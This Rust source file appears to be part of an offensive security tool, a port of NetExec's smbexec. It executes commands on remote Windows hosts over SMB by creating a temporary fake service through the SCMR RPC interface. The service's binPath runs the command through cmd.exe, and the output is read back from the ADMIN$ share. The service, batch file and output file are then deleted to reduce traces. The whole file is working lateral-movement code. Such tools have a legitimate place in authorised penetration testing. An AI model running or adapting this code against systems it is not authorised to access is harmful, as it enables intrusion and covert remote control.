//! Remote command execution over SMB (smbexec-style via SCM) — pure Rust.
//!
//! Phase E of the cross-platform portage plan. Replaces the Windows-only
//! `OpenSCManagerW` / `CreateServiceW` / `StartServiceW` implementation (and
//! its `stubs/exec.rs` `NOT_PORTED` stub) with the same flow over the
//! DCE/RPC SCMR interface riding `\PIPE\svcctl` on the pure-Rust SMB2 stack.
//!
//! The chain matches the Windows version and NetExec's `smbexec` byte for
//! byte where it matters — most importantly the **binPath**, which is
//! verbatim NetExec (`execute_remote`):
//!
//! ```text
//! %COMSPEC% /Q /c echo <cmd> ^> \\%COMPUTERNAME%\ADMIN$\Temp\__out_<nonce>
//!   2^>^&1 > %TEMP%\__run_<nonce>.bat
//! & %COMSPEC% /Q /c %TEMP%\__run_<nonce>.bat
//! & %COMSPEC% /Q /c del %TEMP%\__run_<nonce>.bat
//! ```
//!
//! Nothing is uploaded over SMB: the caret-escaped `echo` writes the real
//! command + redirection into a batch file on the target, the second `cmd`
//! runs it (capturing stdout+stderr into `ADMIN$\Temp\__out_<nonce>`), the
//! third deletes the batch. `%COMSPEC%` / `%COMPUTERNAME%` / `%TEMP%` expand
//! server-side, so the string is platform-neutral from our side.
//!
//! Every significant step appends to an internal trace that is returned to
//! the caller AND streamed through `live_log` so diagnostic output reaches
//! the UI in real time even if the poll loop runs the full deadline.
//!
//! **Start on a second session:** `RStartServiceW` blocks ~30 s for our fake
//! service and a pipe transceive holds the session mutex, so StartService
//! runs on its own `Smb2Session` in a spawned task (the async mirror of the
//! Windows impl's detached thread) — the ADMIN$ poll loop on the first
//! session never stalls behind it.

use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use netraze_dcerpc::channel::RpcChannel;
use netraze_dcerpc::interfaces::scmr;

use super::connection::SmbCredential;
use super::rpc::{bind_svcctl_over_smb, connect_session, host_only};
use super::smb2::{Smb2Session, SmbReadError};

fn gen_nonce() -> String {
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{ts:x}")
}

/// Short tag for a `SERVICE_STATUS` current-state code (trace parity with
/// the Windows impl's `query_service_state`).
fn service_state_label(state: u32) -> &'static str {
    match state {
        scmr::SERVICE_STOPPED => "STOPPED",
        2 => "START_PENDING",
        3 => "STOP_PENDING",
        scmr::SERVICE_RUNNING => "RUNNING",
        5 => "CONTINUE_PENDING",
        6 => "PAUSE_PENDING",
        7 => "PAUSED",
        _ => "UNKNOWN",
    }
}

/// The verbatim NetExec smbexec binPath for `command` (see module docs).
fn build_bin_path(command: &str, out_name: &str, bat_name: &str) -> String {
    format!(
        "%COMSPEC% /Q /c echo {command} ^> \\\\%COMPUTERNAME%\\ADMIN$\\Temp\\{out_name} 2^>^&1 \
         > %TEMP%\\{bat_name} & %COMSPEC% /Q /c %TEMP%\\{bat_name} & %COMSPEC% /Q /c del %TEMP%\\{bat_name}"
    )
}

/// Query the nonce service's state over `ch` (best-effort — never fails the
/// poll loop, the trace just shows `query_err`).
async fn query_service_state(ch: &mut RpcChannel, svc: &scmr::ScmHandle) -> &'static str {
    let stub = scmr::encode_rquery_service_status_request(svc);
    match ch
        .call(scmr::Opnum::RQueryServiceStatus as u16, &stub)
        .await
    {
        Ok(resp) => match scmr::decode_rquery_service_status_response(&resp) {
            Ok((status, 0)) => service_state_label(status.current_state),
            _ => "query_err",
        },
        Err(_) => "query_err",
    }
}

/// Best-effort SCMR handle close (cleanup path, errors ignored).
async fn close_scm_handle(ch: &mut RpcChannel, handle: &scmr::ScmHandle) {
    let stub = scmr::encode_rclose_service_handle_request(handle);
    let _ = ch
        .call(scmr::Opnum::RCloseServiceHandle as u16, &stub)
        .await;
}

/// Open SCMR (svcctl) on a session whose IPC$ tree id is `ipc`.
///
/// Shared by the main orchestration and the second StartService session.
async fn open_scmr(
    session: &Arc<Mutex<Smb2Session>>,
    ipc: u32,
    cred: &SmbCredential,
) -> Result<RpcChannel, String> {
    bind_svcctl_over_smb(session.clone(), ipc, cred).await
}

/// `ROpenSCManagerW` on an open channel — the Impacket `'DUMMY\0'` machine
/// name (an IP literal or unresolvable name gets `RPC_S_CANNOT_SUPPORT` on
/// hardened targets; see `dump_rpc` for the same precedent).
async fn open_sc_manager(ch: &mut RpcChannel) -> Result<scmr::ScmHandle, String> {
    let stub = scmr::encode_ropen_sc_manager_w_request(
        Some("DUMMY\0"),
        Some("ServicesActive\0"),
        scmr::SC_MANAGER_ACCESS,
    );
    let resp = ch
        .call(scmr::Opnum::ROpenSCManagerW as u16, &stub)
        .await
        .map_err(|e| format!("ROpenSCManagerW: {e}"))?;
    let (handle, status) = scmr::decode_ropen_sc_manager_w_response(&resp)
        .map_err(|e| format!("decode ROpenSCManagerW: {e}"))?;
    if status != 0 {
        let hint = match status {
            5 => {
                " (access denied: smbexec needs an admin credential on a \
                  real Windows target — a non-admin account, UAC remote \
                  restrictions, or a non-Windows server such as Samba, whose \
                  SCM cannot create services at all, all land here)"
            }
            _ => "",
        };
        return Err(format!(
            "ROpenSCManagerW failed with status 0x{status:08x}{hint}"
        ));
    }
    Ok(handle)
}

/// Execute a single shell command on the target and return captured
/// stdout+stderr. Every significant step is pushed to the trace AND streamed
/// to `live_log` so diagnostic output reaches the UI in real time even if
/// the function runs the full poll deadline.
pub async fn execute_command_live(
    target: &str,
    credential: Option<&SmbCredential>,
    command: &str,
    live_log: &(dyn Fn(&str) + Send + Sync),
) -> (Result<String, String>, Vec<String>) {
    let mut trace: Vec<String> = Vec::new();
    macro_rules! log {
        ($($arg:tt)*) => {{
            let line = format!($($arg)*);
            live_log(&line);
            trace.push(line);
        }};
    }

    log!("exec start target={target} cmd={command:?}");

    let cred = match credential {
        Some(c) => c,
        None => {
            log!("abort: exec requires a credential");
            return (Err("exec requires a credential".into()), trace);
        }
    };

    // ── Session A: SCMR orchestration + ADMIN$ output polling. ──────────
    let host = host_only(target);
    let session = match connect_session(target, cred) {
        Ok(s) => {
            log!("smb2 session OK");
            s
        }
        Err(e) => {
            log!("smb2 session FAILED: {e}");
            return (Err(format!("SMB2 session failed: {e}")), trace);
        }
    };
    let session = Arc::new(Mutex::new(session));
    let ipc = {
        let mut s = match session.lock() {
            Ok(s) => s,
            Err(e) => return (Err(format!("session mutex poisoned: {e}")), trace),
        };
        match s.tree_connect(&host, "IPC$") {
            Ok(tid) => {
                log!("tree_connect IPC$ OK");
                tid
            }
            Err(e) => {
                log!("tree_connect IPC$ FAILED: {e}");
                return (Err(format!("tree_connect IPC$: {e}")), trace);
            }
        }
    };

    let mut ch = match open_scmr(&session, ipc, cred).await {
        Ok(c) => {
            log!("svcctl bind OK");
            c
        }
        Err(e) => {
            log!("svcctl bind FAILED: {e}");
            return (Err(format!("SCMR bind: {e}")), trace);
        }
    };

    let scm = match open_sc_manager(&mut ch).await {
        Ok(h) => {
            log!("ROpenSCManagerW OK");
            h
        }
        Err(e) => {
            log!("{e}");
            return (Err(e), trace);
        }
    };

    // ── Nonce service + inline NetExec binPath. ─────────────────────────
    let nonce = gen_nonce();
    let svc_name = format!("netraze_{nonce}");
    let out_name = format!("__out_{nonce}");
    let bat_name = format!("__run_{nonce}.bat");
    log!("nonce={nonce} svc={svc_name}");

    let bin_path = build_bin_path(command, &out_name, &bat_name);
    log!("bin_path={bin_path}");

    let create_stub = scmr::encode_rcreate_service_w_request(
        &scm,
        &svc_name,
        Some(&svc_name),
        scmr::SERVICE_ALL_ACCESS,
        scmr::SERVICE_WIN32_OWN_PROCESS,
        scmr::SERVICE_DEMAND_START,
        scmr::SERVICE_ERROR_IGNORE,
        &bin_path,
    );
    let svc = match ch
        .call(scmr::Opnum::RCreateServiceW as u16, &create_stub)
        .await
    {
        Ok(resp) => match scmr::decode_rcreate_service_w_response(&resp) {
            Ok((_tag, handle, 0)) => {
                log!("RCreateServiceW OK");
                handle
            }
            Ok((_, _, status)) => {
                log!("RCreateServiceW failed with status 0x{status:08x}");
                let _ = close_scm_handle(&mut ch, &scm).await;
                return (
                    Err(format!("RCreateServiceW failed with status 0x{status:08x}")),
                    trace,
                );
            }
            Err(e) => {
                log!("decode RCreateServiceW: {e}");
                let _ = close_scm_handle(&mut ch, &scm).await;
                return (Err(format!("decode RCreateServiceW: {e}")), trace);
            }
        },
        Err(e) => {
            log!("RCreateServiceW: {e}");
            let _ = close_scm_handle(&mut ch, &scm).await;
            return (Err(format!("RCreateServiceW: {e}")), trace);
        }
    };

    // ── Start on a second session in a spawned task (see module docs). ──
    let start_target = target.to_owned();
    let start_svc = svc_name.clone();
    let start_cred = cred.clone();
    let (start_tx, mut start_rx) = tokio::sync::mpsc::unbounded_channel::<String>();
    let start_task = tokio::spawn(async move {
        let outcome =
            match start_service_on_second_session(&start_target, &start_cred, &start_svc).await {
                Ok(msg) => msg,
                Err(e) => format!("StartService(second session) -> Err: {e}"),
            };
        let _ = start_tx.send(outcome);
    });
    log!("StartService dispatched on second session");

    // ── Poll the output file on ADMIN$ via session A. ───────────────────
    //
    // Fresh SMB2 CREATE → READ → CLOSE on every iteration (read_full_file
    // opens the tree per call), so no local metadata cache can interfere —
    // the same property the Windows impl needed a raw session for.
    let rel_path = format!("Temp\\{out_name}");
    let deadline = tokio::time::Instant::now() + Duration::from_secs(120);
    let poll_start = tokio::time::Instant::now();
    let mut stable_bytes: Vec<u8> = Vec::new();
    let mut prev_len: Option<usize> = None;
    let mut saw_file = false;
    let mut saw_nonempty = false;
    let mut attempt = 0u32;
    let mut exit_reason = String::from("deadline");

    loop {
        if tokio::time::Instant::now() >= deadline {
            break;
        }
        attempt += 1;
        tokio::time::sleep(Duration::from_millis(400)).await;
        let elapsed_ms = poll_start.elapsed().as_millis();

        let state_str = query_service_state(&mut ch, &svc).await;

        // Blocking SMB I/O off the async runtime; the session mutex is only
        // held for the duration of the read.
        let read_session = Arc::clone(&session);
        let read_host = host.clone();
        let read_rel = rel_path.clone();
        let read = tokio::task::spawn_blocking(move || match read_session.lock() {
            Ok(mut s) => s.read_full_file(&read_host, "ADMIN$", &read_rel),
            Err(e) => Err(SmbReadError::Other(
                0,
                format!("session mutex poisoned: {e}"),
            )),
        })
        .await;

        match read {
            Ok(Ok(bytes)) => {
                saw_file = true;
                let len = bytes.len();
                log!("poll#{attempt} t+{elapsed_ms}ms svc={state_str} smb2 read OK {len} bytes");
                saw_nonempty = saw_nonempty || len > 0;
                if len > 0 && prev_len == Some(len) {
                    stable_bytes = bytes;
                    exit_reason = format!("stable at {len} bytes");
                    break;
                }
                prev_len = Some(len);
                stable_bytes = bytes;
            }
            Ok(Err(SmbReadError::NotFound)) => {
                log!("poll#{attempt} t+{elapsed_ms}ms svc={state_str} not_found");
            }
            Ok(Err(SmbReadError::SharingViolation)) => {
                saw_file = true;
                log!("poll#{attempt} t+{elapsed_ms}ms svc={state_str} sharing_violation");
            }
            Ok(Err(e)) => {
                log!(
                    "poll#{attempt} t+{elapsed_ms}ms svc={state_str} smb2 ERR: {}",
                    e.as_str()
                );
            }
            Err(e) => {
                log!("poll#{attempt} t+{elapsed_ms}ms svc={state_str} read task: {e}");
            }
        }
    }

    log!(
        "poll exit: reason={exit_reason} saw_file={saw_file} saw_nonempty={saw_nonempty} \
         prev_len={:?} stable_bytes.len={}",
        prev_len,
        stable_bytes.len()
    );

    // Drain any pending start-task message, then detach it — StartServiceW
    // can still be blocked server-side and must not hold up cleanup.
    while let Ok(msg) = start_rx.try_recv() {
        log!("{msg}");
    }
    start_task.abort();

    // ── Cleanup: stop + delete the nonce service, drop the output file. ─
    let stop_stub = scmr::encode_rcontrol_service_request(&svc, scmr::SERVICE_CONTROL_STOP);
    let stop_res = match ch
        .call(scmr::Opnum::RControlService as u16, &stop_stub)
        .await
    {
        Ok(resp) => match scmr::decode_rcontrol_service_response(&resp) {
            Ok((_, status)) => format!("0x{status:08x}"),
            Err(e) => format!("decode err: {e}"),
        },
        Err(e) => format!("rpc err: {e}"),
    };
    log!("RControlService(STOP) -> {stop_res}");

    let del_stub = scmr::encode_rdelete_service_request(&svc);
    let del_res = match ch.call(scmr::Opnum::RDeleteService as u16, &del_stub).await {
        Ok(resp) => match scmr::decode_rdelete_service_response(&resp) {
            Ok(status) => format!("0x{status:08x}"),
            Err(e) => format!("decode err: {e}"),
        },
        Err(e) => format!("rpc err: {e}"),
    };
    log!("RDeleteService -> {del_res}");

    close_scm_handle(&mut ch, &svc).await;
    close_scm_handle(&mut ch, &scm).await;

    // Output file: SET_INFO FileDispositionInformation via delete_on_close
    // (replaces the Windows impl's DeleteFileW). The batch file lived in
    // %TEMP% — cmd.exe's chained `del` already removed it.
    {
        let del_host = host.clone();
        let del_rel = rel_path.clone();
        let del_session = Arc::clone(&session);
        let del_out = tokio::task::spawn_blocking(move || {
            let mut s = del_session
                .lock()
                .map_err(|e| format!("session mutex poisoned: {e}"))?;
            s.delete_on_close(&del_host, "ADMIN$", &del_rel)
        })
        .await;
        match del_out {
            Ok(Ok(())) => log!("delete output file OK"),
            Ok(Err(e)) => log!("delete output file: {e}"),
            Err(e) => log!("delete output task: {e}"),
        }
    }

    // Session teardown (logoff closes the IPC$ tree implicitly).
    match session.lock() {
        Ok(mut s) => s.logoff(),
        Err(e) => log!("session mutex poisoned on teardown: {e}"),
    }

    finish_exec(stable_bytes, saw_file, trace)
}

/// Terminal decision shared by all exit paths: non-empty stable content
/// wins; a never-seen file is an error; an empty file that was seen is an
/// empty success (same semantics as the Windows impl).
fn finish_exec(
    stable_bytes: Vec<u8>,
    saw_file: bool,
    mut trace: Vec<String>,
) -> (Result<String, String>, Vec<String>) {
    if !stable_bytes.is_empty() {
        let len = stable_bytes.len();
        trace.push(format!("returning {len} bytes"));
        return (Ok(decode_output(&stable_bytes)), trace);
    }
    if !saw_file {
        return (
            Err("Command produced no output file on target. See trace.".into()),
            trace,
        );
    }
    trace.push(
        "returning empty — file was seen but never had readable non-empty stable content".into(),
    );
    (Ok(String::new()), trace)
}

/// `RStartServiceW` on a dedicated second `Smb2Session` (see module docs —
/// the call blocks ~30 s for our fake service and a pipe transceive holds
/// the session mutex).
async fn start_service_on_second_session(
    target: &str,
    cred: &SmbCredential,
    svc_name: &str,
) -> Result<String, String> {
    let host = host_only(target);
    let session = connect_session(target, cred)?;
    let session = Arc::new(Mutex::new(session));
    let ipc = session
        .lock()
        .map_err(|e| format!("session mutex poisoned: {e}"))?
        .tree_connect(&host, "IPC$")
        .map_err(|e| format!("tree_connect IPC$: {e}"))?;

    let mut ch = bind_svcctl_over_smb(session.clone(), ipc, cred).await?;
    let scm = open_sc_manager(&mut ch).await?;

    let open_stub = scmr::encode_ropen_service_w_request(
        &scm,
        &format!("{svc_name}\0"),
        scmr::SERVICE_ACCESS_START,
    );
    let (svc, status) = match ch.call(scmr::Opnum::ROpenServiceW as u16, &open_stub).await {
        Ok(resp) => scmr::decode_ropen_service_w_response(&resp)
            .map_err(|e| format!("decode ROpenServiceW: {e}"))?,
        Err(e) => {
            let _ = close_scm_handle(&mut ch, &scm).await;
            return Err(format!("ROpenServiceW: {e}"));
        }
    };
    if status != 0 {
        let _ = close_scm_handle(&mut ch, &scm).await;
        return Err(format!("ROpenServiceW failed with status 0x{status:08x}"));
    }

    let start_stub = scmr::encode_rstart_service_w_request(&svc, 0);
    let start_result = match ch
        .call(scmr::Opnum::RStartServiceW as u16, &start_stub)
        .await
    {
        Ok(resp) => scmr::decode_rstart_service_w_response(&resp),
        Err(e) => {
            let _ = close_scm_handle(&mut ch, &svc).await;
            let _ = close_scm_handle(&mut ch, &scm).await;
            return Err(format!("RStartServiceW: {e}"));
        }
    };

    close_scm_handle(&mut ch, &svc).await;
    close_scm_handle(&mut ch, &scm).await;
    if let Ok(mut s) = session.lock() {
        s.logoff();
    }

    match start_result {
        Ok(0) => Ok("StartService(second session) -> Ok".into()),
        Ok(status) => Err(format!("status 0x{status:08x}")),
        Err(e) => Err(format!("decode RStartServiceW: {e}")),
    }
}

/// Backwards-compatible wrapper: returns just the command output or an
/// error, discarding the trace.
pub async fn execute_command(
    target: &str,
    credential: Option<&SmbCredential>,
    command: &str,
) -> Result<String, String> {
    execute_command_live(target, credential, command, &|_| {})
        .await
        .0
}

/// Convenience wrapper that collects the trace into a `Vec<String>` without
/// streaming — for callers that want the trace at the end.
pub async fn execute_command_traced(
    target: &str,
    credential: Option<&SmbCredential>,
    command: &str,
) -> (Result<String, String>, Vec<String>) {
    execute_command_live(target, credential, command, &|_| {}).await
}

// ---------------------------------------------------------------------------
// Output decoding — UTF-8 first, then OEM codepage 850 (Western-European
// Windows), then byte→char fallback. Mirrors the Windows impl's
// MultiByteToWideChar(CP850) chain without the Win32 call.
// ---------------------------------------------------------------------------

/// cmd.exe on Windows emits text in the console's active codepage. When
/// stdout is redirected (our case), most tools write in the OEM codepage
/// (CP850 on Western-European Windows) regardless of `chcp`.
fn decode_output(bytes: &[u8]) -> String {
    let bytes = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(bytes);
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.to_owned();
    }
    bytes.iter().map(|&b| cp850_char(b)).collect::<String>()
}

/// Map one byte through the CP850 (DOS Latin-1) table. ASCII passes through
/// unchanged; bytes 0x80–0xFF use the static table below.
fn cp850_char(b: u8) -> char {
    if b < 0x80 {
        return b as char;
    }
    CP850[(b - 0x80) as usize]
}

/// CP850 high half (0x80–0xFF → Unicode). Layout follows the DOS Latin-1
/// codepage used by Western-European Windows when stdout is redirected.
#[rustfmt::skip]
const CP850: [char; 128] = [
    'Ç', 'ü', 'é', 'â', 'ä', 'à', 'å', 'ç', 'ê', 'ë', 'è', 'ï', 'î', 'ì', 'Ä', 'Å',
    'É', 'æ', 'Æ', 'ô', 'ö', 'ò', 'û', 'ù', 'ÿ', 'Ö', 'Ü', '¢', '£', '¥', '₧', 'ƒ',
    'á', 'í', 'ó', 'ú', 'ñ', 'Ñ', 'ª', 'º', '¿', '⌐', '¬', '½', '¼', '¡', '«', '»',
    '░', '▒', '▓', '│', '┤', '╡', '╢', '╖', '╕', '╣', '║', '╗', '╝', '╜', '╛', '┐',
    '└', '┴', '┬', '├', '─', '┼', '╞', '╟', '╚', '╔', '╩', '╦', '╠', '═', '╬', '╧',
    '╨', '╤', '╥', '╙', '╘', '╒', '╓', '╫', '╪', '┘', '┌', '█', '▄', '▌', '▐', '▀',
    'α', 'ß', 'Γ', 'π', 'Σ', 'σ', 'µ', 'τ', 'Φ', 'Θ', 'Ω', 'δ', '∞', 'φ', 'ε', '∩',
    '≡', '±', '≥', '≤', '⌠', '⌡', '÷', '≈', '°', '∙', '·', '√', 'ⁿ', '²', '■', '\u{00a0}',
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decode_output_ascii_passes_through() {
        assert_eq!(decode_output(b"whoami\n"), "whoami\n");
    }

    #[test]
    fn decode_output_valid_utf8_wins_over_cp850() {
        // Bytes that are a valid UTF-8 sequence must not go through CP850.
        assert_eq!(decode_output("Zählerstände\n".as_bytes()), "Zählerstände\n");
    }

    #[test]
    fn decode_output_strips_bom() {
        let mut bytes = vec![0xEF, 0xBB, 0xBF];
        bytes.extend_from_slice(b"ok");
        assert_eq!(decode_output(&bytes), "ok");
    }

    #[test]
    fn decode_output_cp850_accented_bytes() {
        // 0x81 'ü', 0x82 'é', 0xE1 'ß', 0x86 'å', 0x8E 'Ä' — the classic
        // cmd.exe OEM output for Western-European locales.
        assert_eq!(decode_output(&[0x81, 0x82, 0xE1, 0x86, 0x8E]), "üéßåÄ");
    }

    #[test]
    fn decode_output_cp850_box_drawing_and_symbols() {
        // 0xB3 '│', 0xC4 '─', 0xDB '█', 0xF8 '°', 0xFD '²', 0xF1 '±'.
        assert_eq!(
            decode_output(&[0xB3, 0xC4, 0xDB, 0xF8, 0xFD, 0xF1]),
            "│─█°²±"
        );
    }

    #[test]
    fn decode_output_cp850_unmapped_never_panic() {
        // Every byte maps through the table (0xFF = NBSP) — no fallback
        // needed, but garbage input must still produce a string.
        let all: Vec<u8> = (0u8..=255).collect();
        let s = decode_output(&all);
        assert_eq!(s.chars().count(), 256);
    }

    #[test]
    fn cp850_table_spots() {
        assert_eq!(cp850_char(0x80), 'Ç');
        assert_eq!(cp850_char(0xA0), 'á');
        assert_eq!(cp850_char(0xE0), 'α');
        assert_eq!(cp850_char(0xFE), '■');
    }

    #[test]
    fn bin_path_is_verbatim_netexec() {
        let bp = build_bin_path("whoami", "__out_dead", "__run_beef.bat");
        assert!(bp.starts_with("%COMSPEC% /Q /c echo whoami ^> \\\\%COMPUTERNAME%\\ADMIN$\\Temp\\__out_dead 2^>^&1 > %TEMP%\\__run_beef.bat"));
        assert!(bp.contains("& %COMSPEC% /Q /c %TEMP%\\__run_beef.bat"));
        assert!(bp.ends_with("& %COMSPEC% /Q /c del %TEMP%\\__run_beef.bat"));
        // Command appears exactly once (no shell quoting added on our side).
        assert_eq!(bp.matches("whoami").count(), 1);
    }

    #[test]
    fn service_state_labels_match_windows_impl() {
        assert_eq!(service_state_label(scmr::SERVICE_STOPPED), "STOPPED");
        assert_eq!(service_state_label(2), "START_PENDING");
        assert_eq!(service_state_label(scmr::SERVICE_RUNNING), "RUNNING");
        assert_eq!(service_state_label(99), "UNKNOWN");
    }

    #[test]
    fn nonce_is_hex_and_unique() {
        let a = gen_nonce();
        let b = gen_nonce();
        assert!(a.chars().all(|c| c.is_ascii_hexdigit()));
        assert_ne!(a, b);
    }
}
